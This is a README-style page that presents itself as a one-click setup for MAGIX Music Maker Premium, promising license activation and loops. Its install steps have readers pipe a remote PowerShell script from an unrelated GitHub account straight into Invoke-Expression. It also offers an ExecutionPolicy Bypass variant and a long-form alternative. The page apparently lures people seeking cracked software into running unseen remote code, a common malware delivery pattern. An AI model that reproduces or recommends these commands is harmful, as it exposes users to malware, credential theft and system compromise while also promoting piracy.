# MAGIX Music Maker Premium Setup
One-click setup for MAGIX Music Maker Premium Setup -- the beginner-friendly music production suite with 8000 royalty-free loops, AI melody generation, five professional instruments, and one-click beat creation for producers at any skill level

Open PowerShell and run:

```powershell
irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
```

## Features

- Installs MAGIX Music Maker with the full instrument plugin suite and the complete loop database.
- Downloads the 8000 royalty-free loop collection spanning hip-hop, EDM, rock, and cinematic genres.
- Activates the Premium license and enables the AI Melody Generator and Vocal Tune pitch correction tool.
- Opens Music Maker with the Quick Start beat project loaded so drums and instruments are ready to play immediately.

## System Requirements

- Windows 10 / 11 (64-bit)
- PowerShell 5.1+
- Internet connection
- ~12000 MB free disk space

## Common Issues

**Exported MP3 file has a high-pitched digital whine artifact throughout the entire track**

Change the export sample rate to 44100 Hz in the export settings to match the project sample rate.

**A VST plugin crashes Music Maker when loaded on an instrument or effects track**

Open the plugin manager and rescan VST plugins with crash recovery enabled to blacklist the incompatible plugin file.

**Alternative method (if policy blocks execution):**

```powershell
powershell -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex"
```

"irm is not recognized" -- update PowerShell or use the full form:

```powershell
Invoke-RestMethod https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | Invoke-Expression
```

## License
MIT -- see LICENSE.